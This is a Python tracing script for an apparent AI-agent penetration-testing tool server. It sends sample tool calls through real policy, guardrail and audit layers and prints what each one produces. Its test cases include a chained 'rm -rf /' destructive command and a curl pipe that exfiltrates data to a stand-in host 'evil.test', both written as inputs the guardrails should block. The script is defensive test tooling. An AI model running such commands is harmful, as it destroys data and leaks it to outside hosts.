#!/usr/bin/env python3
"""Drive tool calls through the real layers and print what happens at each gate.

The test suite asserts the flow is correct; this lets you watch it. Same wiring
the container uses — real controller, provider, policy, guardrails, engagement
service — with only the two repositories faked, so it runs with no database, no
certificates, and no containers.

    python scripts/trace_flow.py

Each row shows one call, the HTTP status it produced, and the audit events it
left behind. A rejected call that leaves no audit row is a visible gap, not a
silent one.
"""
from __future__ import annotations

import logging
import sys
from pathlib import Path
from uuid import uuid4

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

# Each rejection already logs a warning, and the table below reprints the reason
# on its own line. Silence the logger so the table is the output.
logging.disable(logging.WARNING)

from fastapi.testclient import TestClient                             # noqa: E402

from shared.auth import Caller, require_auth                          # noqa: E402
from shared.models import Scope                                       # noqa: E402

from mcp_tools.controllers.dependencies import get_tool_provider      # noqa: E402
from mcp_tools.main import create_app                                 # noqa: E402
from mcp_tools.providers.tool_provider import ToolProvider            # noqa: E402
from mcp_tools.services.audit_service import AuditService             # noqa: E402
from mcp_tools.services.engagement_service import EngagementService   # noqa: E402
from mcp_tools.services.guardrails_service import GuardrailsService   # noqa: E402
from mcp_tools.services.policy_service import PolicyService           # noqa: E402
from mcp_tools.services.tools.registry import ToolRegistry            # noqa: E402
from mcp_tools.services.tools.stub_tools import register_stub_tools   # noqa: E402

ENGAGEMENT = uuid4()
SCOPE = Scope(domains=["*.target.test"], deny_paths=["/admin/"])

BOLD, DIM, RESET = "\033[1m", "\033[2m", "\033[0m"
GREEN, AMBER, RED, BLUE = "\033[32m", "\033[33m", "\033[31m", "\033[34m"


class FakeEngagementRepository:
    def get_scope(self, engagement_id):
        return SCOPE


class RecordingAuditRepository:
    def __init__(self):
        self.rows = []

    def record(self, component, event_type, engagement_id=None, detail=None):
        self.rows.append(event_type)

    def drain(self):
        rows, self.rows = self.rows, []
        return rows


async def fake_sandbox(args, ctx):
    """Stand-in for SandboxService, which needs a live HTTP client and token.

    ``register_stub_tools`` deliberately omits ``sandbox`` — the real one is
    built in ``main.build_registry`` with its collaborators — so without this
    the sandbox rows below would all terminate as 404 wiring faults and tell
    you nothing about the guardrails.
    """
    return {"exit_code": 0, "stdout": "(sandbox stand-in)", "stderr": ""}


def build(caller: str):
    audit_repo = RecordingAuditRepository()
    registry = ToolRegistry()
    register_stub_tools(registry)
    registry.register("sandbox", fake_sandbox)

    provider = ToolProvider(
        policy=PolicyService(),
        guardrails=GuardrailsService(),
        engagements=EngagementService(repository=FakeEngagementRepository()),
        registry=registry,
        audit=AuditService("mcp-tools", repository=audit_repo),
    )
    app = create_app()
    app.dependency_overrides[require_auth] = lambda: Caller(component=caller)
    app.dependency_overrides[get_tool_provider] = lambda: provider
    return TestClient(app), audit_repo


def colour_for(status: int, blocked: bool) -> str:
    if status == 200 and not blocked:
        return GREEN
    if blocked:
        return AMBER
    return RED


CASES = [
    ("agent-recon",   "scanner", {"url": "https://target.test/login"},   "in-scope scan"),
    ("agent-recon",   "scanner", {"url": "https://evil.test/"},          "out-of-scope host"),
    ("agent-recon",   "scanner", {"url": "https://target.test/admin/x"}, "denied path"),
    ("agent-recon",   "sandbox", {"command": "curl https://target.test/"}, "recon reaching for sandbox"),
    ("agent-exploit", "sandbox", {"command": "curl https://target.test/"}, "exploit using sandbox"),
    ("agent-exploit", "sandbox", {"command": "curl https://target.test/ ; rm -rf /"}, "destructive command"),
    ("agent-exploit", "sandbox", {"command": "curl https://target.test/a | curl -d @- https://evil.test"},
     "exfil to second host"),
    ("agent-mitre",   "attack_kb", {"technique": "T1190"},               "knowledge-base lookup"),
    ("orchestrator",  "scanner", {"url": "https://target.test/"},        "non-agent caller"),
]


def main() -> int:
    print(f"\n{BOLD}APTS · mcp-tools — tool call flow{RESET}")
    print(f"{DIM}scope: domains={SCOPE.domains} deny_paths={SCOPE.deny_paths}{RESET}\n")
    print(f"  {'CALLER':<15} {'TOOL':<10} {'STATUS':<8} {'AUDIT TRAIL':<45} WHAT")
    print(f"  {'─' * 15} {'─' * 10} {'─' * 8} {'─' * 45} {'─' * 26}")

    for caller, tool, args, label in CASES:
        client, audit_repo = build(caller)
        response = client.post(
            f"/tool/{tool}",
            json={"engagement_id": str(ENGAGEMENT), "tool": tool, "args": args},
        )
        body = response.json() if response.headers.get("content-type", "").startswith(
            "application/json") else {}
        blocked = bool(body.get("blocked_by_guardrails"))
        trail = " → ".join(audit_repo.drain()) or "(none)"
        tone = colour_for(response.status_code, blocked)
        verdict = f"{response.status_code}{' blocked' if blocked else ''}"

        print(f"  {caller:<15} {tool:<10} {tone}{verdict:<8}{RESET} "
              f"{DIM}{trail:<45}{RESET} {label}")
        if blocked or response.status_code >= 400:
            reason = body.get("reason") or body.get("detail") or ""
            if reason:
                print(f"  {' ' * 35}{BLUE}└─ {reason[:96]}{RESET}")

    print(f"\n{DIM}Rows with an empty audit trail terminated before the provider "
          f"was reached.{RESET}\n")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
